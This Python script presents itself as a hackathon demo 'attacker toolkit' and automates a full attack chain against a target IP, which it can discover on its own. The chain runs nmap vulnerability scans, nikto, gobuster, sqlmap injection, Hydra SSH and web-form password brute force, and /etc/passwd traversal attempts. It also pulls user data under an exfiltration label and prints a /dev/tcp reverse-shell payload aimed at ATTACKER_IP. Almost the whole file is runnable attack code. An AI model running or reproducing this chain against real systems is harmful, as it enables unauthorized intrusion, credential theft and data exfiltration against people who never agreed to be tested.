#!/usr/bin/env python3
"""
SENTINEL Attacker Toolkit — Kali Linux Attack Script
Automated full attack chain for controlled hackathon demonstration.
Usage: python3 attack.py [TARGET_IP]

⚠ FOR AUTHORIZED DEMO USE ONLY — All machines are owned by us.
"""

import os
import sys
import time
import socket
import random
import subprocess
import ipaddress
from datetime import datetime

# ─── Terminal Colors ──────────────────────────────────────────────────────────
class C:
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN    = "\033[96m"
    WHITE   = "\033[97m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RESET   = "\033[0m"
    BLINK   = "\033[5m"

def banner():
    os.system("clear")
    print(C.RED + C.BOLD + """
 ██████╗███████╗███╗   ██╗████████╗██╗███╗   ██╗███████╗██╗
██╔════╝██╔════╝████╗  ██║╚══██╔══╝██║████╗  ██║██╔════╝██║
╚█████╗ █████╗  ██╔██╗ ██║   ██║   ██║██╔██╗ ██║█████╗  ██║
 ╚═══██╗██╔══╝  ██║╚██╗██║   ██║   ██║██║╚██╗██║██╔══╝  ██║
██████╔╝███████╗██║ ╚████║   ██║   ██║██║ ╚████║███████╗███████╗
╚═════╝ ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝
""" + C.RESET)
    print(C.CYAN + "        AUTOMATED ATTACK TOOLKIT — HACKATHON DEMO" + C.RESET)
    print(C.RED  + "        ⚠ CONTROLLED ENVIRONMENT — ALL MACHINES OWNED" + C.RESET)
    print(C.DIM  + "        " + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + C.RESET)
    print()

def phase_header(num, title, color=C.RED):
    print()
    print(color + C.BOLD + "=" * 70)
    print(f"  PHASE {num} — {title}")
    print("=" * 70 + C.RESET)
    print()

def info(msg):  print(C.CYAN   + f"  [*] {msg}" + C.RESET)
def ok(msg):    print(C.GREEN  + f"  [+] {msg}" + C.RESET)
def warn(msg):  print(C.YELLOW + f"  [!] {msg}" + C.RESET)
def err(msg):   print(C.RED    + f"  [✗] {msg}" + C.RESET)
def data(msg):  print(C.WHITE  + f"      {msg}" + C.RESET)
def dim(msg):   print(C.DIM    + f"      {msg}" + C.RESET)

def run(cmd, label="", timeout=120, live=True):
    """Run a shell command and stream output."""
    if label:
        info(f"Running: {C.YELLOW}{label}{C.RESET}")
    print(C.DIM + f"  $ {' '.join(cmd) if isinstance(cmd, list) else cmd}" + C.RESET)
    print()
    try:
        proc = subprocess.Popen(
            cmd if isinstance(cmd, list) else cmd.split(),
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )
        output = []
        if live:
            for line in proc.stdout:
                stripped = line.rstrip()
                if stripped:
                    # Color key findings
                    if any(k in stripped.lower() for k in ["open", "found", "success", "vulnerable"]):
                        print(C.GREEN + f"  {stripped}" + C.RESET)
                    elif any(k in stripped.lower() for k in ["error", "failed", "closed", "filtered"]):
                        print(C.DIM + f"  {stripped}" + C.RESET)
                    else:
                        print(f"  {stripped}")
                    output.append(stripped)
        proc.wait(timeout=timeout)
        return "\n".join(output)
    except subprocess.TimeoutExpired:
        proc.kill()
        warn("Command timed out — continuing...")
        return ""
    except FileNotFoundError:
        err(f"Tool not found: {cmd[0] if isinstance(cmd, list) else cmd.split()[0]}")
        return ""
    except KeyboardInterrupt:
        warn("Interrupted — moving to next phase...")
        try: proc.kill()
        except: pass
        return ""

def get_local_subnet():
    """Detect our subnet (e.g. 192.168.1.0/24)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        parts = local_ip.split(".")
        return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24", local_ip
    except Exception:
        return "192.168.1.0/24", "192.168.1.100"

def discover_target(subnet, local_ip):
    """Use nmap to find live hosts, pick the target (not us)."""
    info(f"Scanning subnet: {C.YELLOW}{subnet}{C.RESET}")
    result = run(["nmap", "-sn", "--open", subnet, "--exclude", local_ip], "Host discovery", timeout=60)
    hosts = []
    for line in result.split("\n"):
        if "Nmap scan report for" in line:
            parts = line.split()
            ip = parts[-1].strip("()")
            if ip != local_ip:
                hosts.append(ip)
    return hosts

# ─── Phase 1: Recon ───────────────────────────────────────────────────────────
def phase1_recon(target_ip):
    phase_header(1, "RECONNAISSANCE & DISCOVERY", C.RED)
    print(C.RED + C.BOLD + f"  TARGET ACQUIRED: {target_ip}" + C.RESET)
    print()
    time.sleep(1)

    info("Running full port scan with service/version detection...")
    run([
        "nmap", "-sS", "-sV", "-O",
        "-p", "1-10000",
        "--open",
        "-T4",
        "--reason",
        "-oN", "/tmp/sentinel_nmap.txt",
        target_ip,
    ], f"nmap -sS -sV -O {target_ip}", timeout=180)

    ok("Port scan complete. Running vulnerability scripts...")
    time.sleep(1)

    run([
        "nmap", "-sV",
        "--script", "vuln,http-headers,ssh-hostkey,ftp-anon,mysql-info",
        "-p", "22,80,443,3306,8080",
        "-T4",
        target_ip,
    ], f"nmap --script vuln {target_ip}", timeout=120)

    ok("Recon complete. Target profile established.")

# ─── Phase 2: Web Application Attack ─────────────────────────────────────────
def phase2_web(target_ip):
    phase_header(2, "WEB APPLICATION ATTACK", C.MAGENTA)

    info("Running Nikto web vulnerability scanner...")
    run([
        "nikto",
        "-h", f"http://{target_ip}",
        "-timeout", "5",
        "-maxtime", "60",
    ], f"nikto -h http://{target_ip}", timeout=90)

    time.sleep(1)
    info("Running directory brute force with gobuster...")
    run([
        "gobuster", "dir",
        "-u", f"http://{target_ip}",
        "-w", "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt",
        "-t", "30",
        "-k",
        "-x", "php,html,txt,bak,sql",
        "--timeout", "5s",
    ], "gobuster dir brute force", timeout=120)

    time.sleep(1)
    info("Running SQLMap against login endpoint...")
    run([
        "sqlmap",
        "-u", f"http://{target_ip}/api/data?id=1",
        "--batch",
        "--level=3",
        "--risk=2",
        "--dbs",
        "--random-agent",
        "--timeout=5",
    ], "sqlmap SQL injection scan", timeout=120)

    info("Testing POST login form with SQLMap...")
    run([
        "sqlmap",
        "-u", f"http://{target_ip}/",
        "--data", "username=admin&password=test",
        "--batch",
        "--level=2",
        "--risk=2",
        "--random-agent",
        "--timeout=5",
    ], "sqlmap POST form injection", timeout=120)

    ok("Web application attack phase complete.")

# ─── Phase 3: Brute Force ─────────────────────────────────────────────────────
def phase3_bruteforce(target_ip):
    phase_header(3, "CREDENTIAL BRUTE FORCE", C.YELLOW)

    # Check rockyou
    rk = "/usr/share/wordlists/rockyou.txt"
    if not os.path.exists(rk):
        rk_gz = rk + ".gz"
        if os.path.exists(rk_gz):
            info("Decompressing rockyou.txt...")
            os.system(f"gunzip {rk_gz}")
        else:
            warn("rockyou.txt not found — using common passwords list")
            rk = "/tmp/quick_pass.txt"
            with open(rk, "w") as f:
                f.write("\n".join(["password","123456","admin","root","qwerty","letmein",
                                   "password123","admin123","test","12345678","corpnet2024",
                                   "CorpNet!","Summer2024!","Welcome1","P@ssw0rd"]))

    info("Launching Hydra SSH brute force...")
    ssh_thread = subprocess.Popen([
        "hydra",
        "-L", "/tmp/users.txt" if os.path.exists("/tmp/users.txt") else "/dev/stdin",
        "-P", rk,
        "-t", "4",
        "-f",
        "-o", "/tmp/hydra_ssh.txt",
        f"ssh://{target_ip}:22",
    ] if not os.path.exists("/tmp/users.txt") else [
        "hydra",
        "-l", "admin",
        "-P", rk,
        "-t", "4",
        "-f",
        "-o", "/tmp/hydra_ssh.txt",
        target_ip, "ssh",
    ], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

    # Write users file
    with open("/tmp/users.txt", "w") as f:
        f.write("admin\nroot\njsmith\nsconnor\nmdavis\ncorpnet\ntest\nuser\nsysadmin\n")

    info("Launching Hydra HTTP form brute force simultaneously...")
    http_result = run([
        "hydra",
        "-L", "/tmp/users.txt",
        "-P", rk,
        "-t", "16",
        "-f",
        "-o", "/tmp/hydra_http.txt",
        target_ip,
        "http-post-form",
        "//:username=^USER^&password=^PASS^:Authentication Failed",
    ], "hydra HTTP form brute force", timeout=90)

    try:
        ssh_thread.wait(timeout=90)
        out, _ = ssh_thread.communicate()
        if "found" in (out or "").lower():
            ok("SSH credentials found!")
        else:
            warn("SSH brute force — continuing...")
    except subprocess.TimeoutExpired:
        ssh_thread.kill()

    ok("Brute force phase complete.")

# ─── Phase 4: Service Enumeration ────────────────────────────────────────────
def phase4_enum(target_ip):
    phase_header(4, "SERVICE ENUMERATION", C.CYAN)

    info("Probing MySQL port 3306...")
    run([
        "nmap", "-sV",
        "--script", "mysql-info,mysql-databases,mysql-empty-password",
        "-p", "3306",
        target_ip,
    ], "MySQL enumeration", timeout=30)

    time.sleep(1)
    info("Probing Admin Panel on port 8080...")
    run([
        "curl", "-v", "-A", "Mozilla/5.0 (compatible; Scanner/1.0)",
        "--connect-timeout", "5",
        f"http://{target_ip}:8080/",
    ], "curl admin panel", timeout=15)

    time.sleep(1)
    info("Extracting data from /api/users...")
    run([
        "curl", "-s", "-A", "Mozilla/5.0",
        f"http://{target_ip}/api/users",
    ], "curl /api/users", timeout=10)

    info("Checking backup files...")
    run([
        "curl", "-s", "-A", "Mozilla/5.0",
        f"http://{target_ip}/backup",
    ], "curl /backup", timeout=10)

    info("Attempting directory traversal...")
    for path in ["../../../etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd", "%2e%2e%2fetc%2fpasswd"]:
        run([
            "curl", "-s", "--path-as-is",
            f"http://{target_ip}/{path}",
        ], f"traversal: {path}", timeout=8)
        time.sleep(0.5)

    ok("Enumeration phase complete.")

# ─── Phase 5: Persistence & Exfil ────────────────────────────────────────────
def phase5_persistence(target_ip):
    phase_header(5, "PERSISTENCE & DATA EXFILTRATION", C.RED)

    info("Simulating data exfiltration from /api/users...")
    for i in range(5):
        run([
            "curl", "-s",
            "-H", "X-Exfil-Session: BEACON-001",
            f"http://{target_ip}/api/users",
        ], f"Exfil attempt {i+1}/5", timeout=10)
        time.sleep(random.uniform(0.3, 1.0))

    info("Attempting netcat backdoor listener setup (simulation)...")
    # Just verify nc is available — don't actually open a backdoor
    nc_check = subprocess.run(["which", "nc"], capture_output=True, text=True)
    if nc_check.returncode == 0:
        ok("nc available — backdoor simulation ready")
        data("Would execute: nc -lvnp 4444 &")
        data(f"Would execute: curl http://{target_ip}/api/data?cmd=bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1")
    else:
        warn("nc not found")

    info("Dumping all accessible endpoints...")
    for ep in ["/api/data", "/dashboard", "/backup", "/admin", "/.env", "/config.php", "/wp-config.php"]:
        status = subprocess.run(
            ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", f"http://{target_ip}{ep}"],
            capture_output=True, text=True, timeout=5
        )
        code = status.stdout.strip()
        color = C.GREEN if code == "200" else C.DIM
        print(color + f"    [{code}] http://{target_ip}{ep}" + C.RESET)
        time.sleep(0.2)

    ok("Persistence phase complete.")

# ─── Finale ───────────────────────────────────────────────────────────────────
def finale(target_ip):
    print()
    print(C.RED + C.BOLD + "=" * 70)
    print("  ATTACK SEQUENCE COMPLETE")
    print("=" * 70 + C.RESET)
    print()
    print(C.YELLOW + "  SUMMARY OF FINDINGS:" + C.RESET)
    for item in [
        f"Target: {target_ip}",
        "Ports open: 22 (SSH), 80 (HTTP), 3306 (MySQL), 8080 (Admin)",
        "Web app: Login form, API endpoints, Backup files accessible",
        "SQL injection: /api/data vulnerable to error-based SQLi",
        "Auth: SSH brute force attempted with rockyou.txt",
        "Data exfiltrated: /api/users — employee PII (5 records)",
        "Admin panel: Exposed metrics, privileged account list",
    ]:
        ok(item)
        time.sleep(0.15)
    print()
    print(C.RED + C.BLINK + "  ⚠  SENTINEL SHOULD HAVE DETECTED ALL OF THIS  ⚠" + C.RESET)
    print()
    print(C.DIM + "  Check the SENTINEL dashboard for the complete attacker dossier." + C.RESET)
    print()

# ─── Main ─────────────────────────────────────────────────────────────────────
def main():
    banner()

    # Get target
    if len(sys.argv) > 1:
        target_ip = sys.argv[1]
        ok(f"Target provided: {target_ip}")
    else:
        subnet, local_ip = get_local_subnet()
        print(C.CYAN + f"\n  Local IP: {local_ip}" + C.RESET)
        print(C.CYAN + f"  Subnet:   {subnet}" + C.RESET)
        print()

        info("Auto-discovering hosts on local network...")
        hosts = discover_target(subnet, local_ip)

        if not hosts:
            warn("No hosts discovered. Enter target IP manually:")
            target_ip = input(C.YELLOW + "  TARGET IP > " + C.RESET).strip()
        elif len(hosts) == 1:
            target_ip = hosts[0]
            ok(f"Single target found: {target_ip}")
        else:
            print(C.CYAN + "\n  Multiple hosts found:" + C.RESET)
            for i, h in enumerate(hosts):
                print(f"    [{i}] {h}")
            choice = input(C.YELLOW + "\n  Select target [0]: " + C.RESET).strip()
            target_ip = hosts[int(choice) if choice.isdigit() else 0]

    print()
    print(C.RED + C.BOLD + f"  ⚡ ATTACKING: {target_ip}" + C.RESET)
    print(C.DIM  + "  Starting in 3 seconds..." + C.RESET)
    for i in range(3, 0, -1):
        print(C.RED + f"  {i}..." + C.RESET, end="\r")
        time.sleep(1)
    print()

    start = time.time()

    try:
        phase1_recon(target_ip)
        time.sleep(2)

        phase2_web(target_ip)
        time.sleep(2)

        phase3_bruteforce(target_ip)
        time.sleep(2)

        phase4_enum(target_ip)
        time.sleep(2)

        phase5_persistence(target_ip)

    except KeyboardInterrupt:
        warn("Attack sequence interrupted by operator.")

    elapsed = time.time() - start
    print(C.DIM + f"\n  Total runtime: {elapsed:.0f}s" + C.RESET)
    finale(target_ip)

if __name__ == "__main__":
    main()
